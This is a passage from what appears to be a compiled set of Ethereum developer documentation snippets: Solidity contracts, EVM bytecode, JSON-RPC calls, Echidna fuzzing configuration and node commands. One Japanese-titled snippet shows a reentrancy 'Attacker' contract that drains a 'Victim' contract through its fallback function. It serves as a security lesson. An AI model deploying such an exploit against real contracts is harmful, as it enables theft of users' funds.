html\nCODE:\n```\n<QuizWidget quizKey=\"scaling\" />\n```\n\n----------------------------------------\n\nTITLE: Complete CounterFactory and Counter Implementation in Solidity\nDESCRIPTION: The full implementation of both the Counter and CounterFactory contracts. The factory manages the creation and interaction with individual Counter contracts while maintaining proper access control.\n\nLANGUAGE: solidity\nCODE:\n```\npragma solidity 0.5.17;\n\ncontract Counter {\n\n    uint256 private _count;\n    address private _owner;\n    address private _factory;\n\n\n     modifier onlyOwner(address caller) {\n        require(caller == _owner, \"You're not the owner of the contract\");\n        _;\n    }\n\n    modifier onlyFactory() {\n        require(msg.sender == _factory, \"You need to use the factory\");\n        _;\n    }\n\n     constructor(address owner) public {\n        _owner = owner;\n        _factory = msg.sender;\n    }\n\n     function getCount() public view returns (uint256) {\n        return _count;\n    }\n\n    function increment(address caller) public onlyFactory onlyOwner(caller) {\n        _count++;\n    }\n\n}\n\ncontract CounterFactory {\n\n    mapping(address => Counter) _counters;\n\n    function createCounter() public {\n        require (_counters[msg.sender] == Counter(0));\n        _counters[msg.sender] = new Counter(msg.sender);\n    }\n\n    function increment() public {\n        require (_counters[msg.sender] != Counter(0));\n        Counter(_counters[msg.sender]).increment(msg.sender);\n    }\n\n    function getCount(address account) public view returns (uint256) {\n        require (_counters[account] != Counter(0));\n        return (_counters[account].getCount());\n    }\n\n    function getMyCount() public view returns (uint256) {\n        return (getCount(msg.sender));\n    }\n\n}\n```\n\n----------------------------------------\n\nTITLE: Removing Liquidity from Token Pairs in Uniswap V2\nDESCRIPTION: Function to remove liquidity from a token pair and return both tokens to the liquidity provider. It transfers the LP tokens from the user to the pair, burns them, and returns the underlying assets.\n\nLANGUAGE: solidity\nCODE:\n```\nfunction removeLiquidity(\n    address tokenA,\n    address tokenB,\n    uint liquidity,\n    uint amountAMin,\n    uint amountBMin,\n    address to,\n    uint deadline\n) public virtual override ensure(deadline) returns (uint amountA, uint amountB) {\n    address pair = UniswapV2Library.pairFor(factory, tokenA, tokenB);\n    IUniswapV2Pair(pair).transferFrom(msg.sender, pair, liquidity); // send liquidity to pair\n    (uint amount0, uint amount1) = IUniswapV2Pair(pair).burn(to);\n    (address token0,) = UniswapV2Library.sortTokens(tokenA, tokenB);\n    (amountA, amountB) = tokenA == token0 ? (amount0, amount1) : (amount1, amount0);\n    require(amountA >= amountAMin, 'UniswapV2Router: INSUFFICIENT_A_AMOUNT');\n    require(amountB >= amountBMin, 'UniswapV2Router: INSUFFICIENT_B_AMOUNT');\n}\n```\n\n----------------------------------------\n\nTITLE: DepositERC20 Function Declaration\nDESCRIPTION: Defines a function for depositing ERC-20 tokens from L1 to the same address on L2. Parameters include token addresses, amount, gas limit for L2 execution, and optional additional data to forward.\n\nLANGUAGE: solidity\nCODE:\n```\n    /**\n     * @dev deposit an amount of the ERC20 to the caller's balance on L2.\n     * @param _l1Token Address of the L1 ERC20 we are depositing\n     * @param _l2Token Address of the L1 respective L2 ERC20\n     * @param _amount Amount of the ERC20 to deposit\n     * @param _l2Gas Gas limit required to complete the deposit on L2.\n     * @param _data Optional data to forward to L2. This data is provided\n     *        solely as a convenience for external contracts. Aside from enforcing a maximum\n     *        length, these contracts provide no guarantees about its content.\n     */\n    function depositERC20(\n        address _l1Token,\n        address _l2Token,\n        uint256 _amount,\n        uint32 _l2Gas,\n        bytes calldata _data\n    ) external;\n```\n\n----------------------------------------\n\nTITLE: XOR Opcode (Bitwise) in EVM\nDESCRIPTION: The XOR opcode performs a bitwise exclusive OR operation. It takes two values from the stack and returns the result of applying a bitwise XOR to them.\n\nLANGUAGE: evm-assembly\nCODE:\n```\na ^ b\n```\n\n----------------------------------------\n\nTITLE: Function Filtering Configuration for Echidna\nDESCRIPTION: YAML configuration to either blacklist or whitelist functions during an Echidna fuzzing campaign. The filterBlacklist option determines whether the listed functions are excluded or exclusively included.\n\nLANGUAGE: yaml\nCODE:\n```\nfilterBlacklist: true\nfilterFunctions: [\"f1\", \"f2\", \"f3\"]\n```\n\n----------------------------------------\n\nTITLE: SafeMath Addition Implementation in Solidity\nDESCRIPTION: A SafeMath implementation for addition that prevents integer overflow. This function takes two numbers, adds them, and checks if the result is greater than or equal to both input numbers to prevent overflow. Returns an error if overflow occurs.\n\nLANGUAGE: solidity\nCODE:\n```\nPUSH1 0x0 DUP1 DUP3 DUP5 ADD SWAP1 POP DUP4 DUP2 LT ISZERO PUSH3 0x37F JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x1B DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH32 0x536166654D6174683A206164646974696F6e206f766572666c6f770000000000 DUP2 MSTORE POP PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST DUP1 SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP\n```\n\n----------------------------------------\n\nTITLE: eth_getUncleCountByBlockHash Parameters Example\nDESCRIPTION: A JavaScript example showing the parameters for the eth_getUncleCountByBlockHash method, which retrieves the number of uncles (ommer blocks) in a block identified by its hash.\n\nLANGUAGE: javascript\nCODE:\n```\nparams: [\"0x1d59ff54b1eb26b013ce3cb5fc9dab3705b415a67127a003c3e61eb445bb8df2\"]\n```\n\n----------------------------------------\n\nTITLE: Clearing Token Approval in Solidity\nDESCRIPTION: Private function that removes approval for a specific pizza token. It requires the caller to be the owner of the token and verifies the token exists before clearing its approval status.\n\nLANGUAGE: solidity\nCODE:\n```\nfunction _clearApproval(address owner, uint256 _pizzaId) private {\n    require(pizzaToOwner[_pizzaId] == owner, \"Must be pizza owner.\");\n    require(_exists(_pizzaId), \"Pizza does not exist.\");\n    if (pizzaApprovals[_pizzaId] != address(0)) {\n        pizzaApprovals[_pizzaId] = address(0);\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Accessing Translated String in Variable Assignment\nDESCRIPTION: Shows how to use the t() function from useTranslation hook to assign translated text to a variable.\n\nLANGUAGE: tsx\nCODE:\n```\nconst siteTitle = t(\"site-title\")\n```\n\n----------------------------------------\n\nTITLE: Implementing Transaction Replay Protection with Nonces in Solidity\nDESCRIPTION: Creates a mapping to track nonces for each address to prevent replay attacks in permit transactions. Each time an address uses permit, its nonce is incremented to ensure the same signature can't be reused.\n\nLANGUAGE: solidity\nCODE:\n```\n    mapping(address => uint) public nonces;\n```\n\n----------------------------------------\n\nTITLE: Implementing _setupDecimals Function in ERC-20 Contract\nDESCRIPTION: Internal function to set the decimals value for token display. This should only be called from the constructor as applications don't expect the decimals to change after deployment.\n\nLANGUAGE: solidity\nCODE:\n```\n/**\n * @dev Sets {decimals} to a value other than the default one of 18.\n *\n * WARNING: This function should only be called from the constructor. Most\n * applications that interact with token contracts will not expect\n * {decimals} to ever change, and may work incorrectly if it does.\n */\nfunction _setupDecimals(uint8 decimals_) internal {\n    _decimals = decimals_;\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing _setupDecimals Function in ERC-20 Contract\nDESCRIPTION: Internal function to set the decimals value for token display. This should only be called from the constructor as applications don't expect the decimals to change after deployment.\n\nLANGUAGE: solidity\nCODE:\n```\n/**\n * @dev Sets {decimals} to a value other than the default one of 18.\n *\n * WARNING: This function should only be called from the constructor. Most\n * applications that interact with token contracts will not expect\n * {decimals} to ever change, and may work incorrectly if it does.\n */\nfunction _setupDecimals(uint8 decimals_) internal {\n    _decimals = decimals_;\n}\n```\n\n----------------------------------------\n\nTITLE: Mine Counting Function for Minesweeper in ZoKrates\nDESCRIPTION: Helper function that returns 1 if a mine is present at the specified location in the map and 0 otherwise. Used for calculating the number of mines surrounding a location.\n\nLANGUAGE: zokrates\nCODE:\n```\n// The number of mines in location (x,y)\ndef map2mineCount(bool[${width+2}][${height+2}] map, u32 x, u32 y) -> u8 {\n   return if map[x+1][y+1] { 1 } else { 0 };\n}\n```\n\n----------------------------------------\n\nTITLE: Managing HTML Tags in Crowdin Editor\nDESCRIPTION: Instructions for configuring Crowdin editor settings to simplify HTML tag handling and copying them directly from source text.\n\nLANGUAGE: markdown\nCODE:\n```\n1. Apri le impostazioni ![Come aprire le impostazioni nell'editor](./editor-settings.png)\n\n2. Scorri verso il basso fino alla sezione \"HTML tags displaying\"\n\n3. Seleziona \"Hide\"![Seleziona \"Hide\"](./hide-tags.png)\n\n4. Fai clic su \"Save\"\n```\n\n----------------------------------------\n\nTITLE: Retrieving Transactions in a Specific Ethereum Block with SQL\nDESCRIPTION: This query retrieves all transactions included in Ethereum block 12396854, returning details on each transaction processed in that particular block while ordering them by block timestamp.\n\nLANGUAGE: sql\nCODE:\n```\nSELECT * FROM ethereum.\"transactions\"\nWHERE block_number = 12396854\nORDER BY block_time DESC\n```\n\n----------------------------------------\n\nTITLE: Testing Positive Case with Mocked Token Balance\nDESCRIPTION: Testing the scenario where a wallet has enough tokens to be considered 'rich' by mocking a balance above the threshold.\n\nLANGUAGE: typescript\nCODE:\n```\nit(\"returns true if the wallet has at least 1000001 tokens\", async () => {\n  await mockERC20.mock.balanceOf\n    .withArgs(wallet.address)\n    .returns(utils.parseEther(\"1000001\"))\n  expect(await contract.check()).to.be.equal(true)\n})\n```\n\n----------------------------------------\n\nTITLE: Implementing ownerOf View Function for ERC-721\nDESCRIPTION: Returns the owner address of a specific token ID. This function is required by ERC-721 and throws an error if the token ID is not valid (doesn't exist).\n\nLANGUAGE: vyper\nCODE:\n```\n@view\n@external\ndef ownerOf(_tokenId: uint256) -> address:\n    \"\"\"\n    @dev Returns the address of the owner of the NFT.\n         Throws if `_tokenId` is not a valid NFT.\n    @param _tokenId The identifier for an NFT.\n    \"\"\"\n    owner: address = self.idToOwner[_tokenId]\n    # Throws if `_tokenId` is not a valid NFT\n    assert owner != ZERO_ADDRESS\n    return owner\n```\n\n----------------------------------------\n\nTITLE: Calculating Keccak-256 Hash with web3_sha3\nDESCRIPTION: Example of using the web3_sha3 method to compute the Keccak-256 hash of data. This method takes hex-encoded data and returns the hash result.\n\nLANGUAGE: js\nCODE:\n```\nparams: [\"0x68656c6c6f20776f726c64\"]\n```\n\nLANGUAGE: js\nCODE:\n```\n// Request\ncurl -X POST --data '{\"jsonrpc\":\"2.0\",\"method\":\"web3_sha3\",\"params\":[\"0x68656c6c6f20776f726c64\"],\"id\":64}'\n// Result\n{\n  \"id\":64,\n  \"jsonrpc\": \"2.0\",\n  \"result\": \"0x47173285a8d7341e5e972fc677286384f802f8ef42a5ec5f03bbfa254cb01fad\"\n}\n```\n\n----------------------------------------\n\nTITLE: Referencing UserOperation in EIP-4337 Account Abstraction Implementation\nDESCRIPTION: This code snippet highlights the UserOperation object which is a core component of EIP-4337. It packages user actions with signatures and is broadcast to a dedicated mempool for inclusion in bundle transactions.\n\nLANGUAGE: code\nCODE:\n```\nUserOperation\n```\n\n----------------------------------------\n\nTITLE: Initialisieren eines npm-Projekts für Smart-Contract-Entwicklung\nDESCRIPTION: Befehl zum Starten eines neuen npm-Projekts mit npm init. Dies ist ein notwendiger Schritt bei der Einrichtung eines Hardhat-Projekts für die Ethereum-Entwicklung.\n\nLANGUAGE: bash\nCODE:\n```\nnpm init\n```\n\n----------------------------------------\n\nTITLE: Installing and Generating Validator Keys\nDESCRIPTION: Commands to install the staking deposit CLI and generate validator keys for running an Ethereum validator. This creates both validator keys and deposit data file needed for staking.\n\nLANGUAGE: sh\nCODE:\n```\nsudo apt-get update\nsudo apt-get install staking-deposit-cli\ncd && deposit new-mnemonic --num_validators 1\n```\n\n----------------------------------------\n\nTITLE: Declaring Token Reserves in Uniswap Pair Contract\nDESCRIPTION: Stores the reserve amounts for each token type. These variables use a single storage slot for gas optimization and are accessible through the getReserves function.\n\nLANGUAGE: solidity\nCODE:\n```\nuint112 private reserve0;           // uses single storage slot, accessible via getReserves\nuint112 private reserve1;           // uses single storage slot, accessible via getReserves\n```\n\n----------------------------------------\n\nTITLE: EVM Bytecode for ERC20 Token Implementation\nDESCRIPTION: This snippet shows the raw EVM bytecode that implements ERC20 token functionality. The bytecode contains the instructions executed by the Ethereum Virtual Machine, including operations for token transfers, allowance management, and balance tracking.\n\nLANGUAGE: bytecode\nCODE:\n```\nMSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 DUP2 SWAP1 SSTORE POP PUSH2 0xDC1 DUP2 PUSH1 0x0 DUP1 DUP6 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 SLOAD PUSH2 0xF2D SWAP1 SWAP2 SWAP1 PUSH4 0xFFFFFFFF AND JUMP JUMPDEST PUSH1 0x0 DUP1 DUP5 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 DUP2 SWAP1 SSTORE POP DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH32 0xDDF252AD1BE2C89B69C2B068FC378DAA952BA7F163C4A11628F55A4DF523B3EF DUP4 PUSH1 0x40 MLOAD DUP1 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG3 POP POP POP JUMP JUMPDEST PUSH1 0x0 DUP4 DUP4 GT ISZERO DUP3 SWAP1 PUSH2 0xF1A JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE DUP4 DUP2 DUP2 MLOAD DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP4 DUP4 PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0xEDF JUMPI DUP1 DUP3 ADD MLOAD DUP2 DUP5 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH2 0xEC4 JUMP JUMPDEST POP POP POP POP SWAP1 POP SWAP1 DUP2 ADD SWAP1 PUSH1 0x1F AND DUP1 ISZERO PUSH2 0xF0C JUMPI DUP1 DUP3 SUB DUP1 MLOAD PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB NOT AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP JUMPDEST POP SWAP3 POP POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST POP PUSH1 0x0 DUP4 DUP6 SUB SWAP1 POP DUP1 SWAP2 POP POP SWAP4 SWAP3 POP POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 DUP3 DUP5 ADD SWAP1 POP DUP4 DUP2 LT ISZERO PUSH2 0xFAB JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x1B DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH32 0x536166654D6174683A206164646974696F6E206F766572666C6F770000000000 DUP2 MSTORE POP PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST DUP1 SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST POP POP POP JUMP INVALID GASLIMIT MSTORE NUMBER ORIGIN ADDRESS GASPRICE KECCAK256 PUSH21 0x72616E7366657220746F20746865207A65726F2061 PUSH5 0x6472657373 GASLIMIT MSTORE NUMBER ORIGIN ADDRESS GASPRICE KECCAK256 PUSH2 0x7070 PUSH19 0x6F766520746F20746865207A65726F20616464 PUSH19 0x65737345524332303A207472616E7366657220 PUSH2 0x6D6F PUSH22 0x6E7420657863656564732062616C616E636545524332 ADDRESS GASPRICE KECCAK256 PUSH21 0x72616E7366657220616D6F756E7420657863656564 PUSH20 0x20616C6C6F77616E636545524332303A20747261 PUSH15 0x736665722066726F6D20746865207A PUSH6 0x726F20616464 PUSH19 0x65737345524332303A20617070726F76652066 PUSH19 0x6F6D20746865207A65726F2061646472657373 GASLIMIT MSTORE NUMBER ORIGIN ADDRESS GASPRICE KECCAK256 PUSH5 0x6563726561 PUSH20 0x656420616C6C6F77616E63652062656C6F77207A PUSH6 0x726FA2646970 PUSH7 0x735822122081C8 BLOCKHASH CREATE DUP8 0xCE 0xF9 0x2F 0xEC 0xCB SUB STATICCALL 0xDC PUSH8 0x8B2708C331896EC5 NUMBER 0x2B 0x5D 0x4C PUSH8 0x5F27B6D3E664736F PUSH13 0x63430006020033000000000000\n```\n\n----------------------------------------\n\nTITLE: Displaying Decentralized Node Architecture for Web3 in Markdown\nDESCRIPTION: Markdown image tag showing decentralized node architecture representing Web3, illustrating the distributed nature of the next evolution of the internet.\n\nLANGUAGE: markdown\nCODE:\n```\n![Dezentralisierte Knotenarchitektur, die Web3 darstellt](./web3.png)\n```\n\n----------------------------------------\n\nTITLE: Initializing Web3 with a local Ethereum node\nDESCRIPTION: Creating a Web3 instance that connects to a local Ethereum node or Ganache instance running on the default port.\n\nLANGUAGE: javascript\nCODE:\n```\nconst web3 = new Web3(\"http://localhost:8545\")\n```\n\n----------------------------------------\n\nTITLE: Querying Client Version with web3_clientVersion\nDESCRIPTION: Example of using the web3_clientVersion method to retrieve the current client version. This method takes no parameters and returns a string with the client details.\n\nLANGUAGE: js\nCODE:\n```\n// Request\ncurl -X POST --data '{\"jsonrpc\":\"2.0\",\"method\":\"web3_clientVersion\",\"params\":[],\"id\":67}'\n// Result\n{\n  \"id\":67,\n  \"jsonrpc\":\"2.0\",\n  \"result\": \"Geth/v1.12.1-stable/linux-amd64/go1.19.1\"\n}\n```\n\n----------------------------------------\n\nTITLE: Creating a Hello World Smart Contract in Solidity\nDESCRIPTION: A basic Solidity smart contract that stores a message on creation and allows updating it through a function call. It demonstrates fundamental concepts like state variables, constructors, and public functions in Solidity.\n\nLANGUAGE: solidity\nCODE:\n```\n// Bestimmt die Version von Solidity mit semantischer Versionierung.\n// Learn more: https://solidity.readthedocs.io/en/v0.5.10/layout-of-source-files.html#pragma\npragma solidity ^0.7.0;\n\n// Defines a contract named `HelloWorld`.\n// Ein Smart contract ist eine Sammlung von Funktionen und Daten (sein Zustand). Einmal in die Blockchain integriert, befindet sich ein Contract an einer bestimmten Adresse der Ethereum-Blockchain. Learn more: https://solidity.readthedocs.io/en/v0.5.10/structure-of-a-contract.html\ncontract HelloWorld {\n\n   // Declares a state variable `message` of type `string`.\n   // Zustandsvariablen sind Variablen, deren Werte dauerhaft im Vertragsspeicher hinterlegt werden. The keyword `public` makes variables accessible from outside a contract and creates a function that other contracts or clients can call to access the value.\n   string public message;\n\n    // Ähnlich wie viele Klassen-basierte objektorientierte Sprachen, ist ein Konstruktor\n    // eine spezielle Funktion, die nur bei der Vertragserstellung ausgeführt wird.\n   // Konstruktoren werden verwendet, um die Vertragsdaten zu initialisieren. Erfahre mehr: https://solidity.readthedocs.io/de/v0.5.10/contracts. tml#constructors\n    constructor(string memory initMessage) public {\n        // Akzeptiert ein String Argument `initMessage` und setzt den Wert\n        // in die `message` Speichervariable des Contracts).\n      message = initMessage;\n    }\n\n    // Eine öffentliche Funktion, die ein String-Argument akzeptiert\n    // und die Speichervariable `message` aktualisiert.\n   function update(string memory newMessage) public {\n        message = newMessage;\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: ETH Receive Function for Testing\nDESCRIPTION: Implements a receive function that allows direct ETH deposits with a conservative default gas value. This function is primarily for testing purposes and not intended for normal use.\n\nLANGUAGE: solidity\nCODE:\n```\n    /**\n     * @dev This function can be called with no data\n     * to deposit an amount of ETH to the caller's balance on L2.\n     * Since the receive function doesn't take data, a conservative\n     * default amount is forwarded to L2.\n     */\n    receive() external payable onlyEOA {\n        _initiateETHDeposit(msg.sender, msg.sender, 200_000, bytes(\"\"));\n    }\n```\n\n----------------------------------------\n\nTITLE: Displaying Key Generation Tools Product Cards\nDESCRIPTION: A component that displays a grid of product cards for key generation tools that can help with creating and managing validator keys for Ethereum staking.\n\nLANGUAGE: jsx\nCODE:\n```\n<StakingProductsCardGrid category=\"keyGen\" />\n```\n\n----------------------------------------\n\nTITLE: Setting ERC-20 Transfer Function Selector in Solidity\nDESCRIPTION: Defines the ABI function selector for the ERC-20 transfer function, which is used to transfer tokens between accounts in the pool.\n\nLANGUAGE: solidity\nCODE:\n```\nbytes4 private constant SELECTOR = bytes4(keccak256(bytes('transfer(address,uint256)')));\n```\n\n----------------------------------------\n\nTITLE: Implementing Integer Encoding/Decoding Functions in Python for Dagger-Hashimoto\nDESCRIPTION: Functions for encoding and decoding integers as strings using a big-endian scheme, used in the Dagger-Hashimoto algorithm. These utility functions convert between numerical values and their string representations for cryptographic operations.\n\nLANGUAGE: python\nCODE:\n```\nNUM_BITS = 512\n\ndef encode_int(x):\n    \"Encode an integer x as a string of 64 characters using a big-endian scheme\"\n    o = ''\n    for _ in range(NUM_BITS / 8):\n        o = chr(x % 256) + o\n        x //= 256\n    return o\n\ndef decode_int(s):\n    \"Unencode an integer x from a string using a big-endian scheme\"\n    x = 0\n    for c in s:\n        x *= 256\n        x += ord(c)\n    return x\n```\n\n----------------------------------------\n\nTITLE: Detecting and connecting to MetaMask wallet\nDESCRIPTION: Code snippet to detect if MetaMask is available in the browser, enable it, and create a Web3 instance using the MetaMask provider for user interactions.\n\nLANGUAGE: javascript\nCODE:\n```\nif (window.ethereum != null) {\n  state.web3 = new Web3(window.ethereum)\n  try {\n    // Request account access if needed\n    await window.ethereum.enable()\n    // Accounts now exposed\n  } catch (error) {\n    // User denied account access...\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: 再入可能性攻撃を実行するAttackerコントラクト（Solidity）\nDESCRIPTION: Victimコントラクトの再入可能性脆弱性を悪用する攻撃用コントラクト。フォールバック関数を使って、Victimコントラクトに再入し、資金を繰り返し引き出します。\n\nLANGUAGE: solidity\nCODE:\n```\ncontract Attacker {\n    function beginAttack() external payable {\n        Victim(victim_address).deposit.value(1 ether)();\n        Victim(victim_address).withdraw();\n    }\n\n    function() external payable {\n        if (gasleft() > 40000) {\n            Victim(victim_address).withdraw();\n        }\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Common Return Handling Code at Offset 0xE4\nDESCRIPTION: Shared code block that handles returning memory data. It calculates the correct memory size to return based on a pointer passed on the stack.\n\nLANGUAGE: EVM Bytecode\nCODE:\n```\nJUMPDEST\nPUSH1 0x40\nMLOAD\nDUP1\nSWAP2\nSUB\nSWAP1\nRETURN\n```\n\n----------------------------------------\n\nTITLE: Directory Structure for Components in Ethereum.org Design System\nDESCRIPTION: Defines the recommended directory structure for organizing components in the ethereum.org codebase, showing the proper file organization with index.tsx, stories, and supporting files.\n\nLANGUAGE: markdown\nCODE:\n```\nsrc/\n└── components/\n····└── ComponentA/\n··········├── index.tsx\n··········├── ComponentA.stories.tsx\n··········└── // Any other files as applicable (utils, child components, useHook, etc.)\n```\n\n----------------------------------------\n\nTITLE: Opcodes from Homestead and Earlier Forks\nDESCRIPTION: This shows the DELEGATECALL opcode that was added in the Homestead fork, which allows a contract to delegate execution to another contract while maintaining the original contract's storage context.\n\nLANGUAGE: solidity\nCODE:\n```\nDELEGATECALL\n```\n\nLANGUAGE: solidity\nCODE:\n```\nEXP\n```\n\n----------------------------------------\n\nTITLE: Implementing Buy Function for DEX Contract in Solidity\nDESCRIPTION: Implements the buy function for the DEX contract where users can send Ether and receive tokens in return. The function verifies that the user sends some Ether and that the DEX has enough tokens in its balance before executing the trade.\n\nLANGUAGE: solidity\nCODE:\n```\nfunction buy() payable public {\n    uint256 amountTobuy = msg.value;\n    uint256 dexBalance = token.balanceOf(address(this));\n    require(amountTobuy > 0, \"You need to send some ether\");\n    require(amountTobuy <= dexBalance, \"Not enough tokens in the reserve\");\n    token.transfer(msg.sender, amountTobuy);\n    emit Bought(amountTobuy);\n}\n```\n\n----------------------------------------\n\nTITLE: Running Teku Consensus Client\nDESCRIPTION: Command to run the Teku consensus client on Ethereum mainnet, configuring the data path and execution endpoint connection with JWT authentication.\n\nLANGUAGE: sh\nCODE:\n```\nteku --network mainnet \\\n    --data-path \"/data/ethereum\" \\\n    --ee-endpoint http://localhost:8551 \\\n    --ee-jwt-secret-file \"/path/to/jwtsecret\"\n```\n\n----------------------------------------\n\nTITLE: Running the Client Application\nDESCRIPTION: Command to start the client application that provides the user interface for the Minesweeper game using Vite as a development server.\n\nLANGUAGE: shell\nCODE:\n```\ncd packages/client\npnpm run dev\n```\n\n----------------------------------------\n\nTITLE: Compiling Ethereum Smart Contracts with Hardhat CLI\nDESCRIPTION: Command to compile the Solidity smart contracts in the project using the Hardhat framework, which will generate the necessary artifacts for deployment.\n\nLANGUAGE: bash\nCODE:\n```\nnpx hardhat compile\n```\n\n----------------------------------------\n\nTITLE: Authenticating Cross-Domain Message Origin\nDESCRIPTION: First check in the onlyFromCrossDomainAccount modifier that ensures messages come from the trusted cross-domain messenger contract.\n\nLANGUAGE: solidity\nCODE:\n```\n        require(\n            msg.sender == address(getCrossDomainMessenger()),\n            \"OVM_XCHAIN: messenger contract unauthenticated\"\n        );\n```\n\n----------------------------------------\n\nTITLE: Magic Contract for Corpus Collection Example\nDESCRIPTION: A contract with a magic function that requires specific parameter values to change a state variable. This is used to demonstrate Echidna's corpus collection and modification capabilities.\n\nLANGUAGE: solidity\nCODE:\n```\ncontract C {\n  bool value_found = false;\n  function magic(uint magic_1, uint magic_2, uint magic_3, uint magic_4) public {\n    require(magic_1 == 42);\n    require(magic_2 == 129);\n    require(magic_3 == magic_4+333);\n    value_found = true;\n    return;\n  }\n\n  function echidna_magic_values() public returns (bool) {\n    return !value_found;\n  }\n\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing Story Modes with Language and Viewport in Storybook for React Components\nDESCRIPTION: This snippet demonstrates how to apply multiple story modes to a React component for Chromatic snapshot testing. It imports language and viewport mode combinations and applies them to all stories in the file through the meta configuration.\n\nLANGUAGE: tsx\nCODE:\n```\nimport { Meta, StoryObj } from \"@storybook/react\"\n\nimport { langViewportModes } from \"../../../../.storybook/modes\"\n\nimport ContentHeroComponent, { ContentHeroProps } from \".\"\n\nconst meta = {\n  title: \"Organisms / Layouts / Hero\",\n  component: ContentHeroComponent,\n  parameters: {\n    chromatic: {\n      modes: {\n        ...langViewportModes,\n      },\n    },\n  },\n  // other options as needed\n} satisfies Meta<typeof ContentHeroComponent>\n```\n\n----------------------------------------\n\nTITLE: FNV Hash Implementation for Ethash\nDESCRIPTION: Implementation of a modified Fowler-Noll-Vo (FNV) hash function used in the Ethash algorithm as a non-associative substitute for XOR. This version multiplies the prime with the full 32-bit input.\n\nLANGUAGE: python\nCODE:\n```\nFNV_PRIME = 0x01000193\n\ndef fnv(v1, v2):\n    return ((v1 * FNV_PRIME) ^ v2) % 2**32\n```\n\n----------------------------------------\n\nTITLE: Importing Dependencies for L2StandardBridge in Solidity\nDESCRIPTION: Import statements for the L2StandardBridge contract, including interfaces for L1 and L2 bridges, required for cross-layer token transfers.\n\nLANGUAGE: solidity\nCODE:\n```\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.9;\n\n/* Interface Imports */\nimport { IL1StandardBridge } from \"../../L1/messaging/IL1StandardBridge.sol\";\nimport { IL1ERC20Bridge } from \"../../L1/messaging/IL1ERC20Bridge.sol\";\nimport { IL2ERC20Bridge } from \"./IL2ERC20Bridge.sol\";\n```\n\n----------------------------------------\n\nTITLE: Sample Corpus File Generated by Echidna in JSON\nDESCRIPTION: This JSON structure represents a transaction collected by Echidna during fuzzing, containing details about the function call, parameters, and execution context.\n\nLANGUAGE: json\nCODE:\n```\n[\n  {\n    \"_gas'\": \"0xffffffff\",\n    \"_delay\": [\"0x13647\", \"0xccf6\"],\n    \"_src\": \"00a329c0648769a73afac7f9381e08fb43dbea70\",\n    \"_dst\": \"00a329c0648769a73afac7f9381e08fb43dbea72\",\n    \"_value\": \"0x0\",\n    \"_call\": {\n      \"tag\": \"SolCall\",\n      \"contents\": [\n        \"magic\",\n        [\n          {\n            \"contents\": [\n              256,\n              \"93723985220345906694500679277863898678726808528711107336895287282192244575836\"\n            ],\n            \"tag\": \"AbiUInt\"\n          },\n          {\n            \"contents\": [256, \"334\"],\n            \"tag\": \"AbiUInt\"\n          },\n          {\n            \"contents\": [\n              256,\n              \"68093943901352437066264791224433559271778087297543421781073458233697135179558\"\n            ],\n            \"tag\": \"AbiUInt\"\n          },\n          {\n            \"tag\": \"AbiUInt\",\n            \"contents\": [256, \"332\"]\n          }\n        ]\n      ]\n    },\n    \"_gasprice'\": \"0xa904461f1\"\n  }\n]\n```\n\n----------------------------------------\n\nTITLE: Constructor for L2StandardBridge in Solidity\nDESCRIPTION: The constructor initializes the L2StandardBridge with the L2 cross-domain messenger and L1 token bridge address, setting up the contract for cross-layer communication.\n\nLANGUAGE: solidity\nCODE:\n```\n    